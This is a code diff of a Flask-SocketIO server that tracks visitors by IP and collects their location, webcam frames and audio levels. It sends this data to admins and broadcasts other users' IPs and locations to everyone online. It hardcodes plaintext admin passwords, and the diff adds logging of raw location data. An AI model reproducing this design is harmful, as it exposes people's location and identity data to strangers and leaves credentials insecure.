@@ -8,7 +8,7 @@ bp = Blueprint('random_route', __name__, url_prefix='/random')
 ADMIN_PASSWORD = 'admin123'
 CLEAR_PASSWORD = 'arif123'
 
-clients = {}        # key = IP, value = {id, ip, ua, location, frame, audio, sids, offline}
+clients = {}
 admin_sids = set()
 
 @bp.route('/')
@@ -42,6 +42,8 @@ def handle_connect():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     ua = request.headers.get('User-Agent')
     
+    print(f"🔌 Connect: sid={request.sid}, admin={is_admin}, ip={ip}")
+
     if not is_admin:
         if ip not in clients:
             clients[ip] = {
@@ -58,15 +60,14 @@ def handle_connect():
             if request.sid not in clients[ip]['sids']:
                 clients[ip]['sids'].append(request.sid)
             clients[ip]['offline'] = False
-            # ইউজার-এজেন্ট আপডেট করো (যদি পরিবর্তন হয়)
-            clients[ip]['user_agent'] = ua
-        # ইউজারদের কাছে অন্য ইউজারদের ডেটা পাঠাও (নিজের বাদ)
+        # ইউজারদের আপডেট পাঠাও (নিজের বাদ)
         emit_public_update()
-        print(f"✅ User connected: {ip}")
+        print(f"✅ User connected: {ip}, total clients: {len(clients)}")
     else:
         admin_sids.add(request.sid)
+        # এডমিনকে বর্তমান সব ডেটা পাঠাও
         emit('admin_update', clients, to=request.sid)
-        print(f"🛡️ Admin connected: {request.sid}")
+        print(f"🛡️ Admin connected: {request.sid}, admin_sids={admin_sids}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -79,18 +80,16 @@ def handle_disconnect():
             break
     if request.sid in admin_sids:
         admin_sids.remove(request.sid)
+        print(f"🛡️ Admin disconnected: {request.sid}")
     
-    # ইউজারদের আপডেট পাঠাও (নিজের বাদ)
     emit_public_update()
-    # এডমিনদের আপডেট পাঠাও (সব ডেটা)
     if admin_sids:
         emit('admin_update', clients, to=list(admin_sids))
     print(f"📴 Disconnect, active clients: {len(clients)}")
 
 @socketio.on('ready')
 def handle_ready():
-    # ইউজার পারমিশন দিলে কিছু না
-    pass
+    print(f"✅ Received 'ready' from {request.sid}")
 
 @socketio.on('location_update')
 def handle_location(data):
@@ -101,7 +100,7 @@ def handle_location(data):
         emit_public_update()
         if admin_sids:
             emit('admin_update', clients, to=list(admin_sids))
-        print(f"📍 Location update from {ip}")
+        print(f"📍 Location from {ip}: {data}")
 
 @socketio.on('video_frame')
 def handle_video(data):
@@ -113,26 +112,23 @@ def handle_video(data):
         emit_public_update()
         if admin_sids:
             emit('admin_update', clients, to=list(admin_sids))
+        # লগ (প্রতি ১০ বার)
         if not hasattr(handle_video, 'counter'):
             handle_video.counter = 0
         handle_video.counter += 1
         if handle_video.counter % 10 == 0:
-            print(f"🎥 Video frame from {ip}, audio: {data.get('audio_volume',0)}%")
+            print(f"🎥 Video from {ip}, audio: {data.get('audio_volume',0)}%")
 
-# ========== পাবলিক ইউজারদের জন্য আপডেট (নিজের বাদ + অফলাইন বাদ + কাউন্ট) ==========
+# ========== পাবলিক আপডেট (ইউজারদের জন্য) ==========
 def emit_public_update():
-    # অনলাইন ইউজারদের তালিকা (offline=False যাদের)
     online_clients = {ip: data for ip, data in clients.items() if not data['offline']}
-    offline_count = sum(1 for data in clients.values() if data['offline'])
     online_count = len(online_clients)
+    offline_count = sum(1 for data in clients.values() if data['offline'])
     
-    # প্রতিটি ইউজারকে পাঠানোর জন্য ফিল্টার
     for ip, data in clients.items():
         if data['offline']:
-            continue   # অফলাইন ইউজারদের কাছে কিছু পাঠাবো না
-        # নিজের IP বাদ দিয়ে বাকি online ইউজারদের ডেটা
+            continue
         filtered = {other_ip: other_data for other_ip, other_data in online_clients.items() if other_ip != ip}
-        # সকেট আইডিগুলোতে পাঠাও
         for sid in data['sids']:
             emit('public_update', {
                 'clients': filtered,
